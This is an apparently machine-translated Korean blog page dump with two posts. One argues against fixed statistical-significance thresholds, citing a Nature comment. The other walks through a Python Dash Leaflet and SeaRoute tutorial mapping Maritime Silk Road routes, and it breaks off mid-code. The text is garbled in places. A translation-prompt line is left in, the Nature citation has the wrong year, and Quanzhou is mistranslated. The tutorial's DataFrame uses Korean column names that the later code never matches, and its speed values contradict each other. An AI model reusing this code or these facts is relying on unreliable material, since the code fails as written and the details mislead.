{"pageProps":{"posts":[{"title":"통계적 유의성 재고하기","description":"","date":"2024-05-23 15:32","slug":"2024-05-23-RethinkingStatisticalSignificance","content":"\n<img src=\"/assets/img/2024-05-23-RethinkingStatisticalSignificance_0.png\" />\n\n통계적 유의성은 오늘날 과학적 탐구의 중추 역할을 하지만, 몇 년 전 Nature 저널에서 800명 이상의 연구자가 서명한 호소문을 최근에 발견하면서 통계 검정에 관한 장기간의 아이디어와 생각이 되살아 났어요. 이러한 통계 검정이 과학 연구의 좋은 부분을 망치는 것보다 도와주는 게 더 많다는 것을 깨닫게 되었죠.\n\n일반적으로 연구 결과는 미리 정의된 p-값 임계값에 따라 \"의미 있는\" 또는 \"의미 없는\" 범주로 분류됩니다. 일반적으로 화학 및 생물학 분야에서 사용되는 임계값은 0.05 또는 0.01 또는 0.001입니다. (다른 분야에서 사용되는 임계값과는 분명히 다릅니다.) 여기에는 특히 비전문가들 사이에서 나타나는 첫 번째 문제가 있습니다. 비의미한 결과는 효과가 없다는 것이 아니라, 그에 대한 결정적인 증거가 부족하다는 것을 나타냅니다. 하지만 이를 넘어서, 숨겨진 편견과 이해관계, 특히 매우 경쟁적인 과학 및 공학 분야에서 악화될 수 있는 다른 일반적인 문제들이 있습니다.\n\n나와 다른 많은 이들이 문헌에서 찾아볼 수 있는 토론에서 볼 수 있는 것처럼, 논문들은 통계 검정 대신 핵심 데이터의 상세하고 균형 잡힌 플롯, 아마는 원시 데이터까지 제시해야 한다고 생각해요. 최근 몇 년간, 과학자들은 이와 비슷한 아이디어들을 제기하며 통계적 유의성 검정에서 파생된 \"효과 vs. 무효\"의 이진 측정에 의존하고 있다는 것이 우리를 오도하고 해석을 오해하게 할 수 있다고 주장하고 있습니다. 또한, 나는 중요한 부분이라고 생각하는 것은, 이러한 사고가 과학적 풍경을 왜곡시킬 수 있다는 것입니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n개발자분이세요. 위의 텍스트를 친근한 톤으로 한국어로 번역하겠습니다.\n\n여기서 시작 단락에서 언급한 \"간청\"이 필요한 곳입니다. 이것은 자연(Nature) 저널의 세 명의 연구자들에 의한 주석으로 이루어져 있으며, 과학 연구에서 통계적 유의성의 잘못된 해석과 남용에 대한 800명이 넘는 서명자들의 우려를 드러냅니다. 본질적으로 이 비평은 일반적으로 결과를 임의의 임계값을 기준으로 바이너리 결과로 분류하는 관행에 도전합니다. 예를 들어, p-값에 대한 자주 사용되는 수준들에 대한 것은 일치하는 값을 또는 메트릭뿐만 아니라, p=0.01이나 p=1/10¹⁰, 또는 95% 또는 99.99999%의 신뢰 구간 등 어떤 수준과 종류의 임계값이든 각자의 숫자에 완전히 의존하지 말아야 한다는 것입니다.\n\n이 문제의 핵심에는 통계 검정이 가져오는 \"이분법적\"이고 \"절대적\" 사고 방식이 있습니다. 그리고 전문가에만 영향을 미칠 것이라고 생각하는 것이 아니라 다른 편향에 영향을 받는 전문가들에게도 해당됩니다. 유의하지 않은 결과를 \"차이가 없다\" 또는 \"효과가 없다\"는 증거로 해석하는 경향은 만연하지만, 모든 통계 분석에 내재된 세밀함을 간과하고 잘못된 결론으로 이어질 수 있습니다. 결과적으로 임의의 유의성 임계값을 충족하지 못하기 때문에 잠재적으로 중요한 효과를 너무 쉽게 무시할 수 있습니다. 통계적 값의 임계값 및 잘라내기 선택에 따라 결론이 어떻게 달라질 수 있는지 확인하려면 이 흥미로운 예시를 확인해 보십시오.\n\n# 조치\n\n자연(Nature)의 간청은 문제를 명확하게 드러내는 것뿐만 아니라 몇 가지 조치도 제안합니다. 가장 극단적이고 지지밖에 남지 않는 조치는 통계적 유의성 개념을 완전히 포기하라는 것입니다. 대신, 연구자들은 \"효과 추정량\"과 그와 관련된 불확실성에 초점을 맞추도록 촉구됩니다. 나는 그들만큼 명확하게 더 언급하면, 연구자들은 데이터의 투명한 제시에 중점을 두어야 하며, 관련 텍스트에서는 가능한 해석을 동반할 수 있지만, \"예\" 또는 \"아니요\" 지표를 함께하는 공식 또는 알고리즘으로 계산해서는 안 됩니다. 즉, 과학 논문은 데이터를 가능한 한 오염되지 않게 제시하고, 관련 텍스트에서는 저자들의 해석에 대해 논의해야 하는 것입니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n\"‘효과 추정’ 사용 촉진 정신과 동일하게, Nature에 발표된 논평은 ‘신뢰 구간’을 ‘호환성 구간’으로 대체할 것을 제안합니다. 이 재구성은 데이터와 호환되는 값 범위만 전달한다는 것을 의미하며, 다시 한번 ‘효과 대 무효’의 관점으로 생각하는 함정을 피합니다. 통계적 임계값에 기반한 단순한 ‘예/아니오’ 결정에서 벗어나, 손에 있는 증거를 더 포괄적으로 고려하는 것이 목표입니다.\n\n과학 기사에서 데이터에 주로 초점을 맞추었지만, 같은 개념이 기술 보고서, 문서 자료 등에도 적용될 수 있습니다. 표준 운영 절차의 일부인 고도로 표준화된 프로토콜의 경우 특정 통계 테스트의 사용을 강제할 수 있지만, 이러한 것들은 보통 널리 검증되고, 정확한 실험 설정, 샘플링 프로토콜, 데이터셋 크기 등이 어떻게 수행되어야 하는지에 대해 상세히 설명되어 있습니다. 다른 상황에서는 테스트가 현장에서 실행되며 정확한 실험 계획, 샘플링 프로토콜, 데이터셋 크기 등을 사전에 계획하지 않는 경우도 있습니다. 이러한 상황은 때로 제한되어 있으며, 특정 인구에 특정 약물을 시도하는 경우와 같이 막연하지만, 할 수 있는 일이 별로 없습니다.\n\n## 효과 크기 대 효과 존재 여부에 중점을 두고, 생 데이터에 더 많은 주안점\n\n‘효과 크기’로의 이동 제안은 통계적 유의성과 무관하게 결과의 실용적 중요성을 인정하며, 결론을 독자가 더 많이 짓도록 합니다. 물론 연구를 수행한 사람들은 필요한 모든 주장과 함께 결론을 서술할 기회를 가집니다. 그러나 데이터는 데이터입니다.\"\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n데이터를 더 폭넓게 보여주는 포인트에 대해 유의할 점은, 현대 컴퓨터 미디어가 출판사들이 받아들여야 할 수많은 솔루션을 가능하게 한다는 점을 강조하고 싶습니다. 최근 제가 제시한 것처럼 웹에서 데이터를 시각적으로 표시하는 다양한 가능성을 보는 것만으로도 이러한 기술들 중 하나의 예를 들어보실 수 있습니다.\n\n화면을 회전하거나 그래프를 확대하여 제시된 데이터를 더 잘 탐구할 수 있게 해주는 대화형 그래픽뿐만 아니라 데이터 처리(위 링크된 글에서 분석한 CanvasXpress와 같은 웹 라이브러리에서도 가능)나 분자 구조와 같이 본질적으로 3D인 데이터를 제시하는 것과 같은 작업들도 가능합니다.\n\n# 결론\n\n통계적 유의성을 완전히 없애는 제안이 급진적으로 보일지 모르지만, 이는 통계 분석에 대한 전통적인 접근 방식에 내재된 단점에 대한 점점 커지는 인식을 반영하고 있습니다. 투명성을 촉진하고 더 깊은 불확실성에 대한 더 깊은 이해, 심지어 겸손(특히 과학적 연구에서 매우 경쟁적인 분야에서)에 대한 깊은 인식을 통해 연구자들은 더 견고하고 신뢰할 수 있으며 개방적인 과학적 담론을 육성할 수 있을 것입니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n자연 주석의 저자들이 제안한 (종류의) 패러다임 변화의 목표는 효과의 크기를 우선시하여 통계적 유의성에 상관없이 더 균형있고 편향되지 않은 연구 결과나 기준 또는 필요한 다른 어떤 비교도 얻을 수 있다는 것입니다. 더 나아가 연구 결과를 해석하는 데 연구 설계나 이전 지식과 같은 맥락적 요소들이 더 큰 역할을 할 수 있습니다.\n\n이 개혁에 대한 요구는 통계 측정에 국한되지 않고 과학 보고서의 전반적인 영역에 확장됩니다. 추정치, 불확실성을 상세히 설명하고 엄격한 유의수준을 피함으로써 연구자들은 그들의 발견을 포괄적이고 더 객관적으로 제시할 수 있습니다. 기존의 규범에 도전하는 것이 우려를 불러일으킬 수 있지만, 저는 잠재적 이점(향상된 정확성, 더 탄력적으로 뒷받침된 결론 및 더 통찰력 있는 의사 결정)이 모든 위험을 훨씬 능가한다고 생각합니다.\n\n# 주요 참고문헌\n\n엄격한 통계적 기준에 따라 결론이 어떻게 달라질 수 있는지에 대한 특정 예시를 알고 싶다면(다른 많은 예시 중에서 찾아볼 수 있습니다!) 이 흥미로운 기사를 확인해보세요.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\nNature에 나온 호소: Amrhein, V., Greenland, S., & McShane, B. (2024). 과학자들이 통계적 중요성에 반발하다. https://www.nature.com/articles/d41586-019-00857-9\n\n또 다른 흥미로운 글: Nuzzo, R. (2014). 통계적 오류. Nature, 506(7487), 150–152. https://www.nature.com/articles/506150a\n\nwww.lucianoabriata.com 저는 내 폭넓은 관심사인 자연, 과학, 기술, 프로그래밍 등에 관해 씁니다. 새로운 이야기를 이메일로 받아보려면 구독하세요. 작은 일에 대해 상담하려면 여기서 제 서비스 페이지를 확인하세요. 저에게 연락할 수 있습니다. 팁을 보내고 싶다면 여기로 보낼 수 있습니다.\n","ogImage":{"url":"/assets/img/2024-05-23-RethinkingStatisticalSignificance_0.png"},"coverImage":"/assets/img/2024-05-23-RethinkingStatisticalSignificance_0.png","tag":["Tech"],"readingTime":6},{"title":"데이터부터 대시보드까지 Dash Leaflet 및 SeaRoute 라이브러리를 사용해 고대 해상 실크로드 시각화하기","description":"","date":"2024-05-23 15:29","slug":"2024-05-23-FromDatatoDashboardVisualizingtheAncientMaritimeSilkRoadwithDashLeafletandSeaRoutelibraries","content":"\n![img](/assets/img/2024-05-23-FromDatatoDashboardVisualizingtheAncientMaritimeSilkRoadwithDashLeafletandSeaRoutelibraries_0.png)\n\n저의 박사학위 중 어려운 부분 중 하나는 선박의 해양 노선을 보여주는 대화형 지도 시각화물을 만드는 것이었습니다. 출발지와 도착지 항구 사이의 선박 노선은 육 지역을 건너가지 않고 오직 바다 상에서의 경로여야 했습니다. 이중 seemingly straightforward 였던 작업이 파이썬에서 처음부터 구현하려고 시도할 때 상당히 어려움이 있었습니다 🤷‍♀️. 유사한 작업을 수행할 수 있는 상용 솔루션이 Marine Traffic과 같이 있지만, 저는 오랜 시간 동안 찾을 수 없는 오픈 소스 대안을 찾고 있었습니다. 마침내 2022년 말에 SeaRoute 라이브러리가 Python을 위해 출시되었고(이전에는 Java만 지원되고 있었음), 그로 인해 제 삶이 훨씬 수월해졌습니다. 이 기사에서는 Dash 앱을 위한 대화형 지도 시각화물을 만드는 과정을 안내하겠습니다. Dash Leaflet 및 SeaRoute Python 라이브러리를 사용하여 해상 경로를 표시할 수 있도록 할 것입니다.\n\n# Dash, Dash Leaflet, SeaRoute에 대해 어떻게 생각하시나요?\n\nDash는 React.js를 기반으로 만들어진 강력한 Python 프레임워크로, Python의 모든 계산 능력을 통합하고 있습니다. Dash가 무엇이며 무엇을 할 수 있는지, 어떻게 첫 번째 Dash 앱을 만들고 실행할 수 있는지에 대한 간단한 소개는 이전에 작성한 포스트를 참조해 보세요. Dash에 새로 오신 분이라면, 먼저 이것을 읽어보는 것을 추천합니다...\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n이 게시물에서는 고대 해상 실크로드 경로를 예시로 사용하여 Dash Leaflet 라이브러리와 SeaRoute 라이브러리의 사용을 소개하겠습니다.\n\nDash Leaflet은 상호작용하는 Leaflet 스타일 지도를 Dash 앱에 통합할 수 있는 포꺠 갑을 제공하는 넓은 범위의 지도 시각화 Python 라이브러리입니다. Dash 생태계 내에서 Leaflet.js의 래퍼로, 마커, 다각형, 팝업, 레이어 등과 같은 다양한 기능을 갖춘 지도를 만들고 사용자 정의할 수 있는 구성 요소를 제공합니다.\n\nSeaRoute는 해상에서 점 간 경로를 계산하는 Python 라이브러리로, 예를 들어 휴스턴과 로테르담 항구 사이의 경로를 계산할 수 있습니다. Python에서 이를 처음부터 계산하려면 해양 지역을 나타내는 해양 형상 파일(예: 해상 국경)을 얻고 지도상에 그린 후 출발점과 도착점 사이의 땅정 경로를 계산하여 해당 해양 지역만 횡단하도록 제약을 설정해야 합니다. 이는 넉넉히 말해 매우 복잡한 작업인데, 각 나라마다 자체 데이터를 다른 형식과 소스로 제공하는 등, 통일되고 표준적인 데이터 소스가 아직 존재하지 않기 때문입니다. 시각화만을 위해 이러한 작업을 해야 한다는 것이 좀 과한 것 같죠. 그렇다면 아름다운 지도 시각화가 필요한 여성은 이번 생애에서 어떻게 해결해야 할까요😠? 다행히 2022년 말에 SeaRoute 라이브러리가 출시되며 시같에 경로를 쉽게 계산하여 시같화할 수 있는 문제를 해결했습니다. 아래 지도에서도 확인할 수 있습니다😇.\n\n따라서 이 게시물의 나머지 부분에서는:\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n- SeaRoute를 사용하여 바다 상의 두 지점 사이의 경로 좌표를 계산하세요.\n- Dash Leaflet을 사용하여 지도상에 경로를 시각화하세요.\n- 모든 것을 Dash 앱으로 묶어보세요.\n\n일단 시작해봐요! 🤸‍♀️️\n\n# 해상 실크로드에 대해서 어떻게 생각하세요?\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n해양 실크로드는 고대 시대에 아시아, 아프리카 및 유럽 대륙 간 다양한 문명을 연결한 중요한 해상 무역로였습니다. 이것은 더 넓고 잘 알려진 실크로드 네트워크의 연장선으로, 육지 및 해상 노선을 포함하며 동서양 간 무역, 문화 교류 및 아이디어 및 기술의 전파를 용이하게 했습니다.\n\n중국의 한나라 시대(기원전 206년 ~ 서기 220년)에 시작된 해양 실크로드는 통(618~907년)과 송(960~1279년) 시대에 절정에 이르렀습니다. 남중국해와 인도양을 건너는 중국 선원들은 동남아시아, 인도, 아라비아 반도, 동아프리카 등지의 상인들과 실크, 도자기, 차 등과 같은 상품을 거래했습니다. 그에 대한 보답으로 중국은 향신료, 귀금속, 보석, 이국적인 상품을 수입함으로써 문화와 경제를 발전시켰습니다. 해양 실크로드의 쇠퇴는 14세기경 즈음에 시작되어 해상 무역로가 변화하고 새로운 무역 경로가 나타남에 따라 17세기에는 전통적인 실크로드와 해양 실크로드의 경로가 대부분 사라지며 유럽의 지배력으로 새로운 세계 무역로들이 등장했습니다.\n\n해양 실크로드를 따라가는 몇 가지 대표적인 경로 (이후 이 게시물의 나머지 부분에서 지도로 시각화할 예정)는 다음과 같습니다:\n\n- Quanzhou `Malacca` Calicut `Aden` Alexandria\n- Guangzhou `Manila` Brunei `Surabaya` Jakarta ` Singapore\n- Hangzhou `Ningbo` Nagasaki `Busan` Hakata ` Osaka\n- Guangzhou `Hanoi` Da Nang `Singapore` Colombo ` Muscat\n- Xiamen `Taiwan` Okinawa `Yokohama` Kobe `Nagasaki` Busan\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n해양로 라이브러리는 여러 가지 흥미로운 계산을 제공합니다. 예를 들어, 루트의 길이나 주어진 속도로 여행하는 데 걸리는 시간을 계산할 수 있습니다. 이번 포스트에서는 중국 존크(해양 실크로드 시대에 널리 사용된 선박 종류)가 평균 5 노트의 속도로 항해했다고 가정해 봅시다.\n\n![image](/assets/img/2024-05-23-FromDatatoDashboardVisualizingtheAncientMaritimeSilkRoadwithDashLeafletandSeaRoutelibraries_1.png)\n\n# 대시 앱 구축\n\n## 환경 설정\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n먼저 모든 것에 앞서, 필요한 라이브러리가 설치되어 있는지 확인해야 합니다. 이러한 라이브러리는 Dash, Dash-Leaflet 및 SeaRoute이며, pip를 사용하여 쉽게 설치할 수 있습니다:\n\n```js\npip install dash dash-leaflet searoute\n```\n\n그런 다음, 다음과 같이 가져올 수 있습니다:\n\n```js\nimport dash\nfrom dash import dcc, html\nimport dash_leaflet as dl\nfrom dash.dependencies import Input, Output\nfrom searoute import SeaRoute\n```\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n다음으로, 간단히 Dash 앱의 빈 인스턴스를 초기화할 수 있습니다:\n\n```js\napp = dash.Dash(__name__);\n```\n\n일반적으로, Dash 앱은 두 가지 주요 구성 요소로 구성됩니다: 레이아웃(layout)과 콜백(callbacks). 레이아웃 구성 요소는 앱의 시각적 및 구조적 부분을 정의하며, 콜백 구성 요소는 앱의 상호 작용을 설명합니다. 그러나 앱의 레이아웃에 더 들어가기 전에 요구되는 데이터가 사용 가능한지 확인해야 합니다.\n\n## 데이터 가져오기\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n먼저, 해상 실크로드의 일부 지표적인 항구 및 해당 좌표, 간단한 설명을 담은 표를 작성했어요. 항구 좌표는 추정치이며 OpenStreetMap에서 가져온 것이며, 오픈 데이터베이스 라이선스(ODbL)를 따라 사용되었습니다.\n\n<img src=\"/assets/img/2024-05-23-FromDatatoDashboardVisualizingtheAncientMaritimeSilkRoadwithDashLeafletandSeaRoutelibraries_2.png\" />\n\n```js\nimport pandas as pd\n\n# 항구, 좌표 및 설명을 포함하는 표 작성\nports_data = {\n    '항구': ['아덴', '알렉산드리아', '브루나이', '부산', '칼리컷',\n            '콜롬보', '다낭', '광저우', '하카타', '항저우',\n             '하노이', '자카르타', '고베', '말라카', '마닐라',\n             '무스카트', '나가사키', '닝보', '오키나와', '오사카',\n             '전주', '싱가포르', '수라바야', '대만', '시안멘', '요코하마'],\n    '국가': ['예멘', '이집트', '브루나이', '대한민국', '인도',\n                '스리랑카', '베트남', '중국', '일본', '중국',\n                '베트남', '인도네시아', '일본', '말레이시아', '필리핀',\n                '오만', '일본', '중국', '일본', '일본',\n                '중국', '싱가폴', '인도네시아', '대만', '중국', '일본'],\n    '위도': [12.799, 31.2001, 4.5353, 35.1796, 11.2588,\n                 6.9271, 16.0544, 23.1291, 33.5904, 30.2741,\n                 21.0285, -6.2088, 34.6901, 2.1896, 14.5995,\n                 23.6102, 32.7467, 29.8683, 26.2041, 34.6937,\n                 24.8798, 1.3521, -7.2575, 23.6978, 24.4798, 35.4437],\n    '경도': [45.0289, 29.9187, 114.7277, 129.0756, 75.7804,\n                  79.8612, 108.2022, 113.2644, 130.4017, 120.1551,\n                  105.8542, 106.8456, 135.1955, 102.2501, 120.9842,\n                  58.5922, 129.8734, 121.544, 127.6476, 135.5023,\n                  118.5876, 103.8198, 112.7521, 120.9605, 118.0894, 139.638],\n    '설명': ['붉은해 상거래 경로의 중요한 중심지', '지중해 주요 항구, 유럽과의 연결', '향균판매의 주요 중지점, 이슬람 영향', '실크로드에 대한 한국의 관문', '번성한 무역 중심지, 향신료 무역의 중심',\n                    '인도양 무역로의 주요 항구', '잠바 왕조 시기 중요한 항구', '고대 중국 무역 항구, 산동이라 불림', '실크로드 무역에 중요한 일본의 항구', '대운하의 끝, 실크 생산 중심지',\n                    '베트남의 수도, 고대 무역 도시', '인도네시아의 수도, 자바의 주요 항구', '중요한 일본의 항구, 교토로 향하는 관문', '전략적인 해협, 무역의 십자로', '아시아에서 스페인 무역의 중심지',\n                    '중요한 아라비아 해상 무역 기지', '세계로 향하는 일본의 관문, 네덜란드 무역의 중심', '주요 해상 항구, 중국 무역에 필수', '동아시아 무역로의 중요한 경유지', '일본의 주요항구, 역사적 무역 중심지',\n                    '중국의 주요 항구, 주요 무역 중심지', '전략적인 해협, 주요 무역 기지', '자바의 중요한 항구, 인도네시아 무역에 중요', '해상 무역용 섬 중간지점', '중국의 역사적 항구, 후난으로가는 관문', '외국무역에 개방된 주요 일본의 항구']\n}\n\nports = pd.DataFrame(ports_data)\n```\n\n그 위에, 지도에서 시각화하고 싶은 일부 지표적인 경로(항구 순서)를 정의하고 그것을 DataFrame에 저장합니다:\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n```js\nroute_1 = [\"Quanzhou\", \"Malacca\", \"Calicut\", \"Aden\", \"Alexandria\"];\nroute_2 = [\"Guangzhou\", \"Manila\", \"Brunei\", \"Surabaya\", \"Jakarta\", \"Singapore\"];\nroute_3 = [\"Hangzhou\", \"Ningbo\", \"Nagasaki\", \"Busan\", \"Hakata\", \"Osaka\"];\nroute_4 = [\"Guangzhou\", \"Hanoi\", \"Da Nang\", \"Singapore\", \"Colombo\", \"Muscat\"];\nroute_5 = [\n  \"Xiamen\",\n  \"Taiwan\",\n  \"Okinawa\",\n  \"Yokohama\",\n  \"Kobe\",\n  \"Nagasaki\",\n  \"Busan\",\n];\n\nroutes = pd.DataFrame({\n  Route: [\"route_1\", \"route_2\", \"route_3\", \"route_4\", \"route_5\"],\n  Port_Sequence: [route_1, route_2, route_3, route_4, route_5],\n});\n```\n\n## 경로 계산\n\n필요한 계산을 수행하기 위해 일반적인 route_var 변수를 가정하고, 이 경로에 포함된 각 항구의 이름과 좌표를 DataFrame으로 구조화합니다. 보다 구체적으로, 이 코드는 주어진 경로의 각 항구를 반복하고 그들의 좌표 및 설명을 검색합니다.\n\n```js\nroute_rows = []\n\nfor port in route_var: # 경로에 있는 항구를 반복하면서\n  port_name = port\n  lat = ports.loc[ports['Port'] == port, 'Latitude'].iloc[0]\n  lon = ports.loc[ports['Port'] == port, 'Longitude'].iloc[0]\n  row = {'Port': port_name, 'lat': lat, 'lon': lon}\n  route_rows.append(row)\n\nroute_df = pd.concat([pd.DataFrame(row, index=[0]) for row in route_rows], ignore_index=True)\n```\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n지도 시각화를 시작하려면 Dash-Leaflet 라이브러리의 dl.Marker(), dl.Tooltip 및 dl.LayerGroup() 구성 요소를 사용하여 포트를 마커로 시각화하기 위한 지도 객체를 쉽게 생성할 수 있습니다.\n\n```js\n    # 계산된 포트 마커에서 지도 객체 생성\n    markers = []\n    for i in range(len(route_df)):\n        # 각 포트 마커에 대한 툴팁 생성\n        tooltip = route_df.loc[i, 'Port'] + ', ' + ports.loc[ports['Port'] == route_df.loc[i, 'Port'], 'Description'].iloc[0]\n        markers.append(  # 마커 계산\n            dl.Marker(\n                position=(route_df.loc[i, 'lat'], route_df.loc[i, 'lon']),\n                children=[dl.Tooltip(tooltip)]\n            )\n        )\n    cluster = dl.LayerGroup(children=markers)\n```\n\n이 방법을 사용하면 선택한 경로의 각 포트에 대해 dl.Marker()를 사용하여 마커를 생성하고 dl.Tooltip()을 사용하여 툴팁을 만듭니다. 그런 다음 dl.LayerGroup()를 사용하여 이러한 마커를 단일 레이어 그룹으로 그룹화합니다. LayerGroup() 구성 요소는 여러 지도 요소(마커 등)를 단일 레이어로 그룹화하는 데 사용됩니다. 이를 통해 이러한 요소를 함께 관리하고 제어할 수 있습니다. 예를 들어, 사용자가 한 번의 동작으로 모든 마커를 표시하거나 숨길 수 있으며, 마커를 하나씩 선택하는 대신 모두 선택할 수 있습니다.\n\n바다에서의 경로 계산으로 넘어가면, 아래와 같이 SeaRoute 라이브러리를 사용하여 이를 달성할 수 있습니다:\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n```js\n# 바다에서 경로 계산하기\nmarkers_line = []\nlength = 0\nduration_hours = 0\nfor i in range(0, len(route_df) - 1):\n    origin = [route_df.loc[i, 'lon'], route_df.loc[i, 'lat']]\n    destination = [route_df.loc[i+1, 'lon'], route_df.loc[i+1, 'lat']]\n    searoutes_coords = sr.searoute(origin, destination, append_orig_dest=True, speed_knot=2)\n    searoutes_coords_transposed = [[coord[1], coord[0]] for coord in searoutes_coords['geometry']['coordinates']]\n    markers_line += searoutes_coords_transposed\n\n    length += searoutes_coords['properties']['length']\n    duration_hours += searoutes_coords['properties']['duration_hours']\nduration_days = duration_hours / 24\n```\n\n이전에 언급했듯이 SeaRoute 라이브러리를 사용하면 경로 거리와 항해 시간을 계산하는 것과 같은 추가 속성을 계산할 수 있습니다. 여기에서 속도가 sr.searoute() 함수에서 speed_knot = 5로 정의된 것을 확인하세요.\n\nSeaRoute로 맵 좌표를 계산한 후 dl.Polyline() 구성 요소를 사용하여 맵에 시각화할 수 있습니다. 또한 dl.PolylineDecorator() 구성 요소를 사용하여 선 방향을 나타내는 화살표를 추가할 수 있습니다. patterns 변수에서 간단한 화살표를 직접 정의합니다.\n\n```js\n# 계산된 바다 경로용 맵 객체 생성\nline = dl.Polyline(\n    positions=markers_line,\n    smoothFactor=1.0,\n    color='ForestGreen',\n    weight=1,\n    lineCap='round',\n    lineJoin='round'\n)\npatterns = [dict(offset='5%', repeat='30px', endOffset='10%', arrowHead=dict(pixelSize=8, polygon=False, pathOptions=dict(stroke=True, color='ForestGreen', weight=1, opacity=10, smoothFactor=1)))]\ndline = dl.PolylineDecorator(children=line, patterns=patterns)\n```\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n또한, 각 선택된 노선마다 지도의 중심과 영역을 다시 계산하는 것이 적절하다고 생각했습니다. 이렇게 하면 사용자가 선택한 각 노선마다 지도가 다시 초점을 맞춰서, 마커와 선이 적절하게 표시됩니다.\n\n```js\n# 경계 계산\nmin_lat = min(lat for lat, lon in markers_line) - 2\nmax_lat = max(lat for lat, lon in markers_line) + 2\nmin_lon = min(lon for lat, lon in markers_line) - 2\nmax_lon = max(lon for lat, lon in markers_line) + 2\nbounds = [[min_lat, min_lon], [max_lat, max_lon]]\n\n# 중심 계산\nx, y = zip(*markers_line)\ncentroid = [sum(x) / len(x), sum(y) / len(y)]\n```\n\n마지막으로, 이러한 요소들을 하나의 함수로 묶어 보겠습니다.\n\n```js\n# 